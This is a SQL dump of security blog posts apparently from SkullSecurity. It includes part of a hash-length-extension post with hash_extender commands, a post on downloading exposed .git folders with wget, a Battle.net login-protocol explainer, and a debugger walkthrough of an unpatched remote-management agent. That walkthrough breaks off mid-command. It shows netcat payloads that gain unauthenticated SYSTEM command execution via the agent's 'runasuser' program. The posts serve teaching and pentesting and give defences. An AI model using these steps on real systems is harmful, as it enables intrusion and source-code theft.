fire.\nWhy is it so difficult? Because this is crypto, and crypto is immensely complicated and notoriously difficult to troubleshoot. There are lots of moving parts, lots of side cases to remember, and it\'s never clear why something is wrong, just that the result isn\'t right. What a pain!\nSo, I wrote hash_extender. hash_extender is (I hope) the first free tool that implements this type of attack. It\'s easy to use and implements this attack for every algorithm I could think of.\nHere\'s an example of its use:\n\r\n  $ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5\r\n  Type: md5\r\n  Secret length: 6\r\n  New signature: 6ee582a1669ce442f3719c47430dadee\r\n  New string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64\r\n\nIf you\'re unsure about the hash type, you can let it try different types by leaving off the --format argument. I recommend using the --table argument as well if you\'re trying multiple algorithms:\n\r\n  $ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --out-data-format html --table\r\n  md4       89df68618821cd4c50dfccd57c79815b data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append\r\n  md5       6ee582a1669ce442f3719c47430dadee data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append\r\n\nThere are plenty of options for how you format inputs and outputs, including HTML (where you use %NN notation), CString (where you use \\xNN notation, as well as \\r, \\n, \\t, etc.), hex (such as how the hashes were specified above), etc.\nBy default I tried to choose what I felt were the most reasonable options:\n\nInput data: raw\nInput hash: hex\nOutput data: hex\nOutput hash: hex\n\nHere\'s the help page for reference:\n\r\n--------------------------------------------------------------------------------\r\nHASH EXTENDER\r\n--------------------------------------------------------------------------------\r\n\r\nBy Ron Bowes \r\n\r\nSee LICENSE.txt for license information.\r\n\r\nUsage: ./hash_extender |--file=> --signature= --format= [options]\r\n\r\nINPUT OPTIONS\r\n-d --data=\r\n      The original string that we\'re going to extend.\r\n--data-format=\r\n      The format the string is being passed in as. Default: raw.\r\n      Valid formats: raw, hex, html, cstr\r\n--file=\r\n      As an alternative to specifying a string, this reads the original string\r\n      as a file.\r\n-s --signature=\r\n      The original signature.\r\n--signature-format=\r\n      The format the signature is being passed in as. Default: hex.\r\n      Valid formats: raw, hex, html, cstr\r\n-a --append=\r\n      The data to append to the string. Default: raw.\r\n--append-format=\r\n      Valid formats: raw, hex, html, cstr\r\n-f --format= [REQUIRED]\r\n      The hash_type of the signature. This can be given multiple times if you\r\n      want to try multiple signatures. \'all\' will base the chosen types off\r\n      the size of the signature and use the hash(es) that make sense.\r\n      Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool\r\n-l --secret=\r\n      The length of the secret, if known. Default: 8.\r\n--secret-min=\r\n--secret-max=\r\n      Try different secret lengths (both options are required)\r\n\r\nOUTPUT OPTIONS\r\n--table\r\n      Output the string in a table format.\r\n--out-data-format=\r\n      Output data format.\r\n      Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy\r\n--out-signature-format=\r\n      Output signature format.\r\n      Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy\r\n\r\nOTHER OPTIONS\r\n-h --help \r\n      Display the usage (this).\r\n--test\r\n      Run the test suite.\r\n-q --quiet\r\n      Only output what\'s absolutely necessary (the output string and the\r\n      signature)\r\n\nDefense\nSo, as a programmer, how do you solve this? It\'s actually pretty simple. There are two ways:\n\nDon\'t trust a user with encrypted data or signatures, if you can avoid it.\nIf you can\'t avoid it, then use HMAC instead of trying to do it yourself.  HMAC is designed for this.\n\nHMAC is the real solution. HMAC is designed for securely hashing data with a secret key.\nAs usual, use constructs designed for what you\'re doing rather than doing it yourself. The key to all crypto! [pun intended]\nAnd finally, you can grab the hash_extender tool on Github!', '\'Crypto\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (40, 'Using “Git Clone” to get Pwn3D', 'Ron Bowes', '2012-8-7', 'Hey everybody!\nWhile I was doing a pentest last month, I discovered an attack I didn\'t previously know, and I thought I\'d share it. This may be a Christopher Columbus moment - discovering something that millions of people already knew about - but I found it pretty cool so now you get to hear about it!\nOne of the first things I do when I\'m looking at a Web app - and it\'s okay to make a lot of noise - is run the http-enum.nse Nmap script. This script uses the http-fingerprints.lua file to find any common folders on a system (basically brute-force browsing). I\'m used to seeing admin folders, tmp folders, and all kinds of other interesting stuff, but one folder in particular caught my eye this time - /.git.\n\nNow, I\'ll admit that I\'m a bit of an idiot when it comes to git. I use it from time to time, but not in any meaningful way. So, I had to hit up my friend @mogigoma. He was on his cellphone, but managed to get me enough info to make this attack work.\nFirst, I tried to use git clone to download the source. That failed, and I didn\'t understand why, so I gave up that avenue right away.\nNext, I wanted to download the /.git folder. Since directory listings were turned on, this was extremely easy:\n$ mkdir git-test\r\n$ cd git-test\r\n$ wget --mirror --include-directories=/.git http://www.target.com/.git\nThat\'ll take some time, depending on the size of the repository. When it\'s all done, go into the folder that wget created and use git --reset:\n$ cd www.site.com\r\n$ git reset --hard\r\nHEAD is now at [...]\nThen look around - you have their entire codebase!\n$ ls\r\ndb  doc  robots.txt  scripts  test\r\n\nBrowse this for interesting scripts (like test scripts?), passwords, configuration details, deployment, addresses, and more! You just turned your blackbox pentest into a whitebox one, and maybe you got some passwords in the deal! You can also use \"git log\" to get commit messages, \"git remote\" to get a list of interesting servers, \"git branch -a\" to get a list of branches, etc.\nWhy does this happen?\nWhen you clone a git repository, it creates a folder for git\'s metadata - .git - in the folder where you check it out. This is what lets you do a simple \"git pull\" to get new versions of your files, and can make deployment/upgrades a breeze. In fact, I intentionally leave .git folders in some of my sites - like my hackerspace, SkullSpace. You can find this exact code on github, so there\'s no privacy issue; this only applies to commercial sites where the source isn\'t available, or where more than just the code is bring stored in source control.\nThere are a few ways to prevent this:\n\nRemove the .git folder after you check it out\nUse a .htaccess file (or apache configuration file) to block access to .git\nKeep the .git folder one level up - in a folder that\'s not available to the Web server\nUse a framework - like Rails or .NET - where you don\'t give users access to the filesystem\n\nThere may be other ways as well, use what makes sense in your environment!\nFinding this in an automated way\nA friend of mine - Alex Weber - wrote an Nmap script (his first ever!) to detect this vulnerability and print some useful information about the git repository! This script will run by default when you run nmap -A, or you can specifically request it by running nmap --script=http-git <target>. You can quickly scan an entire network by using a command like:\nnmap -sS -PS80,81,443,8080,8081 -p80,81,443,8080,8081 --script=http-git <target>\nThe output for an affected host will look something like:\n\r\nPORT     STATE  SERVICE\r\n80/tcp   open   http\r\n| http-git: \r\n|   Potential Git repository found at 206.220.193.152:80/.git/ (found 5 of 6\r\nexpected files)\r\n|   Repository description: Unnamed repository; edit this file \'description\' to name \r\nthe...\r\n|   Remote: https://github.com/skullspace/skullspace.ca.git\r\n|_   -> Source might be at https://github.com/skullspace/skullspace.ca\r\n\nAnd that\'s all there is to it! Have fun, and let me know if you have any interesting results so I can post a followup!', '\'Hacking\', \'Nmap\', \'Tools\'', 'https://blog.skullsecurity.org/2012/using-git-clone-to-get-pwn3d');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (41, 'Battle.net authentication misconceptions', 'Ron Bowes', '2012-5-24', 'Hey everybody,\nThere have been a lot of discussion and misconceptions about Battle.net\'s authentication lately. Having done a lot of work on the Battle.net protocol, I wanted to lay some to rest. \nThe first thing to understand is that, at least at the time I was working on this, there were three different login methods (this is before they combined the Web logins with Battle.net logins - I can\'t speak on those). The three methods are:\n\nCHAT protocol - deprecated a long, long time ago\nOld Login System (OLS) - used by Diablo, Warcraft 2 BNE, Starcraft, and Diablo II\nNew Login System (NLS) - used by Warcraft 3, World of Warcraft, and in some fashion by newer games. Also supported - but unused - by Diablo II\n\nI\'ll describe, in detail, how each of these work. The summary is, though, that at no point does a game client ever send a plaintext password to the server. The closest is the SHA1 of the password, which is used for account creation in old games. For more information, read on!\n\nCHAT protocol\nCreating an account\nYou can\'t create an account on CHAT.\nLogging in\nThe login was plaintext, over an insecure connection.\nOld Login System\nThe Old Login System (or OLS) is the original login system used by Battle.net. It uses a modified version of SHA1 hashing that I\'m going to call Broken-SHA1 for the remainder of this post. It\'s identical to SHA1 with the exception of an inverted shift or two. There\'s been a lot of discussion on whether or not this was intentional - to throw off reverse engineers - or a simple bug. Personally, I lean towards a bug, since there were other similar bugs throughout the login sequence on older games. Additionally, there is no evidence of anti-reverse engineering attempts in any of the Blizzard games I\'ve worked on, even Warden and Lockdown and other measures are pure anti-hacking. \nAccount creation under OLS\nThis is quite possibly the riskiest part of the entire process. When you create an account under the OLS, you send it the username and a Broken-SHA1() hash of the uppercased password. The server validates that the username is valid, and if it is, it stores the Broken-SHA1 hash. \nInterestingly, you can use any 160-bit value for the Broken-SHA1 hash, it doesn\'t actually have to be Broken-SHA1. This is because Battle.net simply stores the value it receives on the server side, and validates it when you log in.\nAccount login under OLS\nWhen you log in, three values are used:\n\nA 32-bit token generated by the server (server seed)\nA 32-bit token generated by the client (client seed)\nThe password\n\nThe client seed and server seed are exchanged before the authentication is attempted. As before, the password is converted to uppercase, and hashed with Broken-SHA1. Then, the client and server seeds are appended to the password, and the Broken-SHA1 is calculated again. This gives a 160-bit value that is sent to the server. The server takes the same two values - which were exchanged - and the Broken-SHA1 of the uppercased password - which it has stored - and performs the same calculation. The server compares the hash it generated to the hash that the client sent, and if everything goes according to plan, the hashes match. \nNew Login System\nThe New Login System (NLS) first appeared - as unused code - in Diablo 2. It was then used in Warcraft 3, and a slightly modified version was used in World of Warcraft. I can\'t comment on Starcraft 2 or Diablo 3, having never worked on them. \nNLS uses the SRP Version 6 as the basis for its authentication protocol, which uses RSA-like public key cryptography. I explain this in full on my wiki, but I\'ll summarize the important parts here. \nAccount creation under NLS\nWhen a user creates an account, the client sends three values, defined as s, v, and the username. \n\ns is the salt. It is randomly generated from a cryptographically secure random number generator.\nv is the validator. It is generated from the formula v = gx % N.\ng and N are known constants, shared between all installations of all games.\nx is defined as x = SHA1(s + SHA1(C + \":\" + P))\nC and P are the username and password, respectively, converted to uppercase.\n\nSo, to summarize, the client sends the salt, and the verifier. The salt is randomly generated, and the verifier is based on the username, password, and salt. \nAccount login under NLS\nAccount logins are a little more complicated. There are four steps. \nFirst, the client sends A and C. \n\nA is a 256-bit public key based on a, which is a randomly generated session key. It is derived from A using the following formula: A = ga % N. As before, g and N are constants. a is a private key generated from random bytes.\nC is the username, converted to uppercase.\n\nSecond, the server replies with s and B\n\ns - the salt - is the same one the client sent when it created the account.\nB is a public session key, generated by the server much the same way as A is generated by the client - B = (v + gb) % N, where b is randomly generated.\n\nThird, the client sends M1 (otherwise known as the proof). It is calculated by a fairly complex formula:\nM1 = SHA1(I, SHA1(C), s, A, B, K)\nWhere:\n\nI is a constant, calculated in a fairly weird way (see my wiki for more details)\nC is, as before, the uppercase username\ns, A, and B are the salt, client public key, and server public key, as exchanged\nK is a shared key derived from S\n\nS is where all the magic happens. It\'s generated through a different formula on the server and the client - since the server knows A, B, and b, while the client knows A, a, and B. Here are the respective formulas:\n\n(client) S = ((N + B - v) % N)(a + ux) % N\n(server) S = (A * (vu % N))b % N\n\nKeep in mind that v - the verifier - is what was sent when the account was created, and is based on the uppercase username, uppercase password, and the salt. The variable u is derived from B and x is derived from the username and password. \nSo, the client calculates its value, and sends it to the server. The server calculates its value, and compares it to what the client sent. If they match, authentication (of the client) is successful and the server returns M2. \nAnd that brings us to the last step. Not only does the client prove to the server that it knows the password, the server also proves to the client that it knows the password. When implementing the protocol, this isn\'t technically necessary, but it\'s a security measure so I implemented it anyway. \nM2 is simply: M2 = SHA1(A + M1 + K), where A is, as before, the client\'s public key; M1 is the value from the previous step; and K is, as with M1, the shared key derived from S, which is the complex formula discussed above. \nThe server and client both generate M2, and the server sends M2 to the client. If the client verifies that M2 is correct, then the client is sure that it\'s talking to a valid server and it continues the connection. \nAt this point, the protocols continue on as before. In the beta for Warcraft 3, all messages after the login completed were encrypted with RC4 using K as a shared key. Once Warcraft 3 was released, the encryption was disabled and all traffic after the login is currently plaintext.\nWhat\'s the point?\nThe point of writing this blog is to give some insight into Battle.net\'s protocols, and to demonstrate that, at no time during the normal use of any Battle.net games does Blizzard have access to your plaintext password. Yes, the passwords are converted to uppercase before hashing. That\'s probably a bad idea - especially in the modern world - but it really dates back to their first Battle.net game - Diablo - from 1996. Since then, they\'ve developed much better login systems, but they\'ve kept the passwords case insensitive. \nIf you fail a certain number of logins against Battle.net, your IP address is temporarily banned. This makes it fairly difficult to bruteforce most accounts. It requires significant resources (proxies, bots, etc.) to make an attack feasible. It\'s much easier to compromise accounts via phishing and malware, so that\'s what attackers do. \nThere are lots of things I didn\'t go over - upgrading OLS accounts to NLS, email password resets, password changes, etc. - but they\'re all fairly logical, and use the minimum amount of information required (typically the same information as you used to create the account). You can find more information on my Battle.net SRP page and on BNetDocs Redux. \nThere are also Battle.net authenticator tokens, which I haven\'t researched at all so I can\'t talk about.', '\'Passwords\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2012/battle-net-authentication-misconceptions');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (42, 'Remote control manager FAIL', 'Ron Bowes', '2011-12-19', 'Hey guys,\nToday, I thought it\'d be fun to take a good look at a serious flaw in some computer-management software. Basically, the software is designed for remotely controlling systems on networks (for installing updates or whatever). As far as I know, this vulnerability is currently unpatched; there are allegedly mitigations, but you have to pay to see them! (A note to vendors - making us pay for your patches or mitigation notes only makes your customers less secure. Please stop doing that!)\nThis research was done in the course of my work at Tenable Network Security on the Reverse Engineering team. It\'s an awesome team to work on, and we\'re always hiring (for this team and others)! If you\'re interested and you have mad reverse engineering skillz, or any kind of infosec skillz, get in touch with me privately! (rbowes-at-tenable-dot-com if you\'re interested in applying)\n\nThe advisory\nI\'m not going to talk too much about the advisory, but I\'ll just say this: it was on ZDI, and basically said that the vulnerability was related to improper validation of credentials allowing the execution of arbitrary shell commands. Pretty vague, but certainly an interesting challenge!\nGetting started\nOne of the obvious places to start is to load up the .exe file into IDA (disassembler) and look at the networking functions. Another - easier - option is load up a debugger (WinDbg) and throw a breakpoint on winsock32!recv or ws2_32!recv, then send data to the program to see where it breaks. That\'s normally the first thing I try if the protocol is unknown (and sometimes even if it\'s a known protocol). \nBy putting a breakpoint on recv, sending it data with netcat, and using the \'gu\' command to step out of the receive function, I wound up looking at this code in IDA:\n\nBasically, it calls recv with a length of \'1\' and stores the results in a local buffer. Then it jumps to this bit of code:\n\nEssentially, it\'s checking if the value byte it just received is \'0\' (the null byte, \"\\0\"). If it is, it falls through, does some logging, then returns (not shown). \nI decided to call this function \"read_from_socket\". \nBased on this little bit of code, I determined some information about the protocol - it receives a series of bytes, up to some maximum length, that are terminated by a null byte (\"\\0\"). \nDiving into the protocol\nThe next thing we want to know is how or where the received data is used. We can trace through the assembly, or we can do it the easy way and use a debugger. So, naturally, I decided to take the easy way out and continued using the debugger. I opted to put a breakpoint at 40507c using Windbg, which is just below the recv code shown above:\n0:002> bp 40507c\nThen I resume the process in Windbg with the \'g\' command (or I can press F5):\n0:002> g\nThen I use netcat to send \'test\\0\' (that is, test with a null byte at the end) to the process (note that this isn\'t the real port):\nron@armitage ~ $ echo -ne \"test\\0\" | nc -vv 192.168.1.112 1234\r\n192.168.1.112: inverse host lookup failed: \r\n(UNKNOWN) [192.168.1.112] 1234 (?) open\r\n sent 5, rcvd 0\r\nron@armitage ~ $ \r\n\nAnd, of course, back in the debugger, it hits our breakpoint. After that, we inspect ecx (which should be the buffer):\n0:002> bp 40507c\r\n0:002> g\r\nBreakpoint 0 hit\r\neax=00000005 ebx=001576a8 ecx=00a2ec64 edx=00a2edbc esi=001576a8 edi=00000000\r\neip=0040507c esp=00a2eb08 ebp=00a2eb24 iopl=0         nv up ei pl nz na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\r\nXXXXXXXX+0x507c:\r\n0040507c 51              push    ecx\r\n0:001> db ecx\r\n00a2ec64  74 65 73 74 00 00 00 00-00 ff a2 00 10 00 00 00  test............\r\n[...]\r\n\necx, as we would expect, points to the buffer we just received (\"test\\0\", followed by whatever). Now, we want to know where that data is used. To do that, we use a break-on-access breakpoint - ba - which will break the program\'s execution when the data is read, then \'g\', for \'go\', to continue execution:\n0:001> ba r4 00a2ec64\r\n0:001> g\r\n\nImmediately afterwards, as expected, the breakpoint is hit when the process tries to read the \"test\\0\" string:\nBreakpoint 1 hit\r\neax=00000005 ebx=001576a8 ecx=00000000 edx=00000074 esi=001576a8 edi=00000000\r\neip=00404074 esp=00a2eb38 ebp=00a2ec8c iopl=0         nv up ei ng nz ac po cy\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293\r\nXXXXXXXX+0x4074:\r\n00404074 85d2            test    edx,edx\nIt breaks at 404074! That means that line is where the buffer is read from memory (actually, it\'s read the line before - the break happens after the read, not before it)\nGoing back to IDA, here\'s what the code looks like:\n\nI circled the points where the buffer is read in red. First, it reads each character from a local variable that I named \'buffer\' - [ebp+ecx+buffer] - into edx as a signed value (when you see a buffer being read with \'movsx\' - move sign extend - that often leads to sign-extension vulnerabilities, though not in this case). It checks if it\'s null - which would mean it\'s at the end of the string - and exits the loop if it is.\nA few lines later, the second time the buffer is read, it\'s read into ecx. Each character is passed into _isdigit() and, if it\'s not a digit, it exits the loop with an error message, \"Illegal Port number\". Hmm! So, now we know that the first part of the protocol is apparently a port number terminated by a null byte. Awesome! But weird? Why are we telling it a port number?\nConnect back\nIf we scroll down in IDA a little bit, and find where the function ends after successfully reading a port number, here\'s the code we find:\n\nThere\'s some logging here - I love logging! - that says the value we just received is called the \'return socket\'. Then a function is called that basically connects back to the client on the port number just received. I\'m not going to go any deeper because the code isn\'t interesting or useful to us. I never did figure out what this second connection is used for, but the program doesn\'t seem to care if it fails.\nSo that\'s the first client-to-server message figured out! To summarize a bit:\n\nClient connects to server\nClient sends server a null-terminated port number\nServer connects back to client on that port\nThe new connection isn\'t used for anything, as far as I can tell\n\nMoving right along...\nNow that we\'ve got the first message all sorted out, we\'re interested in what the second message is. Rather than trying to navigate the tangled code (which leads through a select() and a few other functions), we\'re going to generate another packet with netcat and see where it\'s read, just like last time. \nFirst, we clear our breakpoints and put a new one on 40507c again (the same place as our last breakpoint - right after a packet is read):\n0:001> bc *\r\n0:001> bp 0040507c\r\n0:001> g\nThen we connect with netcat, this time with a proper connect-back port (\"12345\\0\") and a second string (\"test\\0\"):\nron@armitage ~ $ echo -ne \"12345\\0test\\0\" | nc -vv 192.168.1.112 1234\r\n192.168.1.112: inverse host lookup failed: \r\n(UNKNOWN) [192.168.1.112] 1234 (?) open\r\n\nThe breakpoint we set earlier will fire on the first line again:\nBreakpoint 0 hit\r\neax=00000006 ebx=001576a8 ecx=00a2ec64 edx=00a2edbc esi=001576a8 edi=00000000\r\neip=0040507c esp=00a2eb08 ebp=00a2eb24 iopl=0         nv up ei pl nz na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\r\nxxxxxxxx+0x507c:\r\n0040507c 51              push    ecx\r\n0:001> db ecx\r\n00a2ec64  31 32 33 34 35 00 00 00-00 ff a2 00 10 00 00 00  12345...........\nBut we aren\'t interested in that, and run \'g\' to continue:\n0:001> g\r\nBreakpoint 0 hit\r\neax=00000005 ebx=001576a8 ecx=00a2ec64 edx=00a2edbc esi=001576a8 edi=00000000\r\neip=0040507c esp=00a2e7e0 ebp=00a2e7fc iopl=0         nv up ei pl nz na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\r\nxxxxxxxx+0x507c:\r\n0040507c 51              push    ecx\r\n0:001> db ecx\r\n00a2ec64  74 65 73 74 00 00 00 00-00 00 00 00 00 00 00 00  test............\nNow we\'ve found the string we\'re interested in!\nOnce again, we put a breakpoint-on-read on ecx and resume execution. The process will break again when the \"test\\0\" string is read:\n0:001> g\r\nBreakpoint 1 hit\r\neax=74736574 ebx=001576a8 ecx=00a2ec64 edx=00000000 esi=001576a8 edi=00000000\r\neip=00422162 esp=00a2e808 ebp=00a2ec8c iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\r\nxxxxxxxx+0x22162:\r\n00422162 bafffefe7e      mov     edx,7EFEFEFFh\nThat is, at 422162. A pro-tip - if you notice the constant 0x7EFEFEFF, or something similar, you\'re probably in a string manipulation function. And this is no exception - according to IDA, this is strlen(). To get out, we use \'gu\':\n0:001> gu\r\nBreakpoint 1 hit\r\neax=74736574 ebx=001576a8 ecx=00000001 edx=00000000 esi=00a2ec64 edi=00a3b0b8\r\neip=00422424 esp=00a2e708 ebp=00a2e710 iopl=0         nv up ei ng nz ac pe cy\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297\r\nxxxxxxxx+0x22424:\r\n00422424 89448ffc        mov     dword ptr [edi+ecx*4-4],eax ds:0023:00a3b0b8=00000000\r\n\nNow we\'re in memcpy! At this point, I started using \'gu\' over and over till I finally found something interesting:\n0:001> gu\r\neax=00a3b0b8 ebx=001576a8 ecx=00000001 edx=00000000 esi=00a35078 edi=00000000\r\neip=0041beb6 esp=00a2e718 ebp=00a2e734 iopl=0         nv up ei pl nz na po nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\r\nxxxxxxxx+0x1beb6:\r\n0041beb6 83c40c          add     esp,0Ch\r\n0:001> gu\r\neax=00440000 ebx=001576a8 ecx=004448e4 edx=00000032 esi=00a35078 edi=00000000\r\neip=0041c056 esp=00a2e73c ebp=00a2e74c iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\r\nxxxxxxxx+0x1c056:\r\n0041c056 83c40c          add     esp,0Ch\r\n0:001> gu\r\neax=00440000 ebx=001576a8 ecx=004448e4 edx=00000032 esi=00a35078 edi=00000000\r\neip=00419d00 esp=00a2e754 ebp=00a2e798 iopl=0         nv up ei pl nz ac pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\r\nxxxxxxxx+0x19d00:\r\n00419d00 83c40c          add     esp,0Ch\r\n0:001> gu\r\neax=00a30000 ebx=001576a8 ecx=00000000 edx=00a2e734 esi=00a35078 edi=00000000\r\neip=00416fe5 esp=00a2e7a0 ebp=00a2e7d4 iopl=0         nv up ei pl nz ac pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\r\nxxxxxxxx+0x16fe5:\r\n00416fe5 83c40c          add     esp,0Ch\r\n0:001> gu\r\neax=00000000 ebx=001576a8 ecx=00436f88 edx=00040000 esi=001576a8 edi=00000000\r\neip=004187f5 esp=00a2e7dc ebp=00a2e7ec iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\r\nxxxxxxxx+0x187f5:\r\n004187f5 83c40c          add     esp,0Ch\r\n0:001> gu\r\neax=00000000 ebx=001576a8 ecx=00436f88 edx=00040000 esi=001576a8 edi=00000000\r\neip=0041f5ca esp=00a2e7f4 ebp=00a2e800 iopl=0         nv up ei pl nz ac po cy\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213\r\nxxxxxxxx+0x1f5ca:\r\n0041f5ca 83c40c          add     esp,0Ch\r\n0:001> gu\r\neax=00000000 ebx=001576a8 ecx=00436f88 edx=00040000 esi=001576a8 edi=00000000\r\neip=00404465 esp=00a2e808 ebp=00a2ec8c iopl=0         nv up ei pl nz ac pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\r\nxxxxxxxx+0x4465:\r\n00404465 83c408          add     esp,8\nFinally, at 404465, I see this code:\n\n\"Getting password\"! It looks like I ran into some authentication code! If I scroll down further, I find this code:\n\n\"Getting command\", followed by a call to read_from_socket(), which is the function that basically does recv(). Sweet! \nIt would take too many screenshots to show it all here, but to summarize the function I\'m looking at, it basically takes the following actions:\n\nLogs \"Getting username\"\nReads a string up to a null byte (\\0)\n(we broke into the function right here while it was processing that string)\nLogs \"Getting password\"\nReads a string up to a null byte (\\0)\nLogs \"Getting command\"\nReads a string up to a null byte (\\0)\n\nThere are many ways to proceed from here, but I figured I\'d put a breakpoint on the read following the \"Getting command\" line, and then to send a string with all the requisite fields (a connect-back port, a username, a password, and a command). Knowing from the advisory that the vulnerability was in the authentication, I decided to try sending in garbage values. I didn\'t try looking at the code where the username/password are verified - I figured I\'d just skip that code (it\'s pretty long). \n0:001> bc *\r\n0:001> bp 40465d\r\n0:001> g\nThen run the app and use netcat to send a test command:\nron@armitage ~ $ echo -ne \"12345\\0myuser\\0mypass\\0mycommand\\0\" | nc -vv 192.168.1.112 1234\r\n192.168.1.112: inverse host lookup failed: \r\n(UNKNOWN) [192.168.1.112] 1234 (?) open\r\n\nAnd, it breaks! \n0:001> bc *\r\n0:001> bp 40465d\r\n0:001> g\r\nBreakpoint 0 hit\r\neax=00a2edbc ebx=001576a8 ecx=00a2e83c edx=00000032 esi=001576a8 edi=00000000\r\neip=0040465d esp=00a2e804 ebp=00a2ec8c iopl=0         nv up ei pl nz na po nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\r\nxxxxxxxx+0x465d:\r\n0040465d e84e090000      call    xxxxxxxx+0x4fb0 (00404fb0)\nSweet! \nI took a few dead-end paths here, but eventually I decided that, knowing that \'mycommand\' is the command it\'s planning to run, I\'d put a breakpoint on CreateProcessA, send the \'mycommand\' string again, and see what happens:\n0:001> bc *\r\n0:001> bp kernel32!CreateProcessA\r\n0:001> bp kernel32!CreateProcessW\r\n0:001> g\r\n\nThen the netcat command again:\nron@armitage ~ $ echo -ne \"12345\\0myuser\\0mypass\\0mycommand\\0\" | nc -vv 192.168.1.112 1234\r\n192.168.1.112: inverse host lookup failed: \r\n(UNKNOWN) [192.168.1.112] 1234 (?) open\r\n\nThen, the breakpoint fires:\nBreakpoint 0 hit\r\neax=00000000 ebx=001576a8 ecx=00a2db48 edx=00a29cc0 esi=00000029 edi=00000000\r\neip=77e424b9 esp=00a29788 ebp=00a2df60 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\r\nkernel32!CreateProcessA:\r\n77e424b9 8bff            mov     edi,edi\nSure enough, it breaks! I immediately run \'gu\' (\'go up\') to exit the CreateProcessA function:\n0:001> gu\r\neax=00000000 ebx=001576a8 ecx=77e722e9 edx=00000000 esi=00000029 edi=00000000\r\neip=0040b964 esp=00a297b4 ebp=00a2df60 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\r\nxxxxxxxx+0xb964:\r\n0040b964 898558bdffff    mov     dword ptr [ebp-42A8h],eax ss:0023:00a29cb8=7ffdd000\nAnd find myself at 40b964. Loading up that address in IDA, here\'s what it looks like (the call is circled in red):\n\nI\'d like to verify the command that\'s being sent to CreateProcessA, to see if it\'s something I can manipulate easily. So I put a breakpoint at 40b95e:\n0:001> bc *\r\n0:001> bp 40b95e\r\n0:001> g\nAnd send the usual command:\nron@armitage ~ $ echo -ne \"12345\\0myuser\\0mypass\\0mycommand\\0\" | nc -vv 192.168.1.112 1234\r\n192.168.1.112: inverse host lookup failed: \r\n(UNKNOWN) [192.168.1.112] 1234 (?) open\nWhen it breaks, I dump the memory at ecx - the register that stores the command:\nBreakpoint 0 hit\r\neax=00000000 ebx=001576a8 ecx=00a2db48 edx=00a29cc0 esi=00000029 edi=00000000\r\neip=0040b95e esp=00a2978c ebp=00a2df60 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\r\nxxxxxxxx+0xb95e:\r\n0040b95e ff15cc004300    call    dword ptr [xxxxxxxx+0x300cc (004300cc)] ds:0023:004300cc={kernel32!CreateProcessA (77e424b9)}\r\n0:001> db ecx\r\n00a2db48  43 3a 5c 50 52 4f 47 52-41 7e 31 5c xx xx xx xx  C:\\PROGRA~1\\XXXX\r\n00a2db58  xx xx 7e 31 5c xx xx xx-xx 5c 41 67 65 6e 74 5c  XX~1\\XXXX\\Agent\\\r\n00a2db68  6d 79 63 6f 6d 6d 61 6e-64 20 00 00 00 00 00 00  mycommand ......\nAha! It\'s prepending the path to the program\'s folder to our command and passing it to CreateProcessA! The natural thing to do is to use \'../\' to escape this folder and run something else, but that doesn\'t work. I never actually figured out why - and it seemed to kinda work - but it was doing some sort of filtering that would give me bad results. Eventually, I had an idea - which programs are stored in that folder anyways?\n\nexecute.exe? hide.exe? runasuser.exe? Could it BE that simple?\nI fire up netcat again:\nron@armitage ~ $ echo -ne \"12345\\0myuser\\0mypass\\0runasuser calc\\0\" | nc -vv 192.168.1.112 1234\r\n192.168.1.112: inverse host lookup failed: \r\n(UNKNOWN) [192.168.1.112] 1234 (?) open\r\n sent 35, rcvd 1\r\n\nAnd check the process list:\n\nAnd ho-ly crap! We have command execution! Unauthenticated! As SYSTEM!! Game over, I win! \nWriting the check\nBut wait, there\'s no output on netcat. No indication at all that this worked, in fact. Crap! Wut do?\nIt occurred to me that this particular application also has a Web server built in. Can I write to files using this command execution? I try:\nron@armitage ~ $ echo -ne \"12345\\0myuser\\0mypass\\0runasuser cmd /c \\\"ipconfig > c:\\\\myfile\\\"\\0\" | nc -vv 192.168.1.112 